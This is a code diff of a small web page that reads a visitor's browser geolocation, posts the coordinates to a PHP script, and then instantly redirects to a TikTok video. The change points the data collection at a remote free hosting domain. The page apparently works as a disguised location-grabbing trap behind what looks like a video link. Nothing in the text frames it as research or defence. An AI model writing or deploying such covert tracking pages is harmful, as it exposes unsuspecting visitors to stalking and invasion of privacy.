@@ -16,17 +16,17 @@
         function sendLocation(position) {
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
-            
-            // サーバーに位置情報を送信
-            fetch("save_location.php", {
+
+            // 無料PHPサーバーのURLに変更
+            fetch("bokunoko.myartsonline.com/save_location.php", {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
                 body: `lat=${lat}&lon=${lon}`
-            }).finally(redirectNow); // 送信後すぐにリダイレクト
+            }).finally(redirectNow);
         }
 
         function redirectNow() {
-            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513?is_from_webapp=1&sender_device=pc&web_id=7484352181497267728"); // 飛ばしたいURL
+            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513"); // リダイレクト先のURL
         }
 
         getLocation();
